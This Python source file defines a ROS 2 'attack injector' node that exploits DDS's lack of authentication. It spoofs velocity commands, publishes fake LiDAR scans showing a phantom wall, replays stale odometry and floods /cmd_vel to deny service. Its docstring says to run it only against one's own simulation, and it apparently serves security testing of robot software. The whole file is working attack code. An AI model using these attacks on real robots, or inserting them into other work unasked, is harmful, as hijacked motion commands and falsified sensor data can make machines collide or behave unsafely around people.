"""Attack injector: simulates an attacker who has joined the ROS 2 network.

Plain DDS has no authentication, so any process on the same network and
domain ID can publish to any topic. This node uses that to run one attack:

* ``cmd_vel_spoof``: publish its own velocity commands on ``/cmd_vel``.
* ``scan_spoof``: publish fake LiDAR scans showing a wall close to the robot.
* ``odom_replay``: record odometry during the start delay, then replay it with the old
  timestamps so the robot appears to be somewhere it is not.
* ``flood``: publish zero commands on ``/cmd_vel`` at a very high rate (DoS).

Only run this against your own simulation.
"""

from geometry_msgs.msg import Twist, TwistStamped
from nav_msgs.msg import Odometry
import rclpy
from rclpy.node import Node
from rclpy.qos import qos_profile_sensor_data
from sensor_msgs.msg import LaserScan

ATTACKS = ('cmd_vel_spoof', 'scan_spoof', 'odom_replay', 'flood')


class AttackInjectorNode(Node):

    def __init__(self):
        super().__init__('attack_injector')
        self.declare_parameter('attack', 'cmd_vel_spoof')
        self.declare_parameter('start_delay_s', 5.0)
        self.declare_parameter('duration_s', 20.0)
        self.declare_parameter('cmd_vel_stamped', True)
        self.declare_parameter('spoof_linear', 0.2)
        self.declare_parameter('spoof_angular', 1.5)
        self.declare_parameter('phantom_wall_m', 0.4)
        self.declare_parameter('flood_hz', 1000.0)

        self.attack = self.get_parameter('attack').value
        if self.attack not in ATTACKS:
            raise ValueError(f'unknown attack {self.attack!r}, choose one of {ATTACKS}')
        self.stamped = self.get_parameter('cmd_vel_stamped').value
        self.start_delay = self.get_parameter('start_delay_s').value
        self.duration = self.get_parameter('duration_s').value

        self.t0 = None  # set once the (simulation) clock is running
        self.last_scan = None
        self.recorded = []
        self.replay_index = 0

        if self.attack in ('cmd_vel_spoof', 'flood'):
            msg_type = TwistStamped if self.stamped else Twist
            self.pub = self.create_publisher(msg_type, '/cmd_vel', 10)
        elif self.attack == 'scan_spoof':
            self.pub = self.create_publisher(LaserScan, '/scan', qos_profile_sensor_data)
            self.create_subscription(LaserScan, '/scan', self.on_scan, qos_profile_sensor_data)
        else:
            self.pub = self.create_publisher(Odometry, '/odom', 10)
            self.create_subscription(Odometry, '/odom', self.on_odom, 10)

        rate = {'cmd_vel_spoof': 20.0, 'scan_spoof': 5.0, 'odom_replay': 30.0,
                'flood': self.get_parameter('flood_hz').value}[self.attack]
        self.create_timer(1.0 / rate, self.on_timer)
        self.get_logger().info(f'Attack {self.attack} starts in {self.start_delay:.0f} s')
        self.announced = False

    def now(self):
        return self.get_clock().now().nanoseconds * 1e-9

    def started(self):
        if self.t0 is None and self.now() > 0.0:
            self.t0 = self.now()
        return self.t0 is not None

    def active(self):
        if not self.started():
            return False
        elapsed = self.now() - self.t0 - self.start_delay
        return elapsed >= 0.0 and (self.duration <= 0.0 or elapsed < self.duration)

    def on_scan(self, msg):
        # Our own spoofed scans also arrive here; keep only real ones.
        wall = self.get_parameter('phantom_wall_m').value
        if any(r != wall for r in msg.ranges):
            self.last_scan = msg

    def on_odom(self, msg):
        if not self.started():
            return
        if self.now() < self.t0 + self.start_delay and len(self.recorded) < 10000:
            self.recorded.append(msg)

    def on_timer(self):
        if not self.active():
            return
        if not self.announced:
            self.get_logger().warn(f'Attack {self.attack} running')
            self.announced = True
        getattr(self, 'send_' + self.attack)()

    def twist_msg(self, linear, angular):
        if self.stamped:
            msg = TwistStamped()
            msg.header.stamp = self.get_clock().now().to_msg()
            twist = msg.twist
        else:
            msg = twist = Twist()
        twist.linear.x = linear
        twist.angular.z = angular
        return msg

    def send_cmd_vel_spoof(self):
        self.pub.publish(self.twist_msg(self.get_parameter('spoof_linear').value,
                                        self.get_parameter('spoof_angular').value))

    def send_flood(self):
        self.pub.publish(self.twist_msg(0.0, 0.0))

    def send_scan_spoof(self):
        if self.last_scan is None:
            return
        fake = LaserScan()
        fake.header.frame_id = self.last_scan.header.frame_id
        fake.header.stamp = self.get_clock().now().to_msg()
        for field in ('angle_min', 'angle_max', 'angle_increment', 'time_increment',
                      'scan_time', 'range_min', 'range_max'):
            setattr(fake, field, getattr(self.last_scan, field))
        fake.ranges = [self.get_parameter('phantom_wall_m').value] * len(self.last_scan.ranges)
        self.pub.publish(fake)

    def send_odom_replay(self):
        if not self.recorded:
            return
        self.pub.publish(self.recorded[self.replay_index % len(self.recorded)])
        self.replay_index += 1


def main(args=None):
    rclpy.init(args=args)
    node = AttackInjectorNode()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.try_shutdown()


if __name__ == '__main__':
    main()
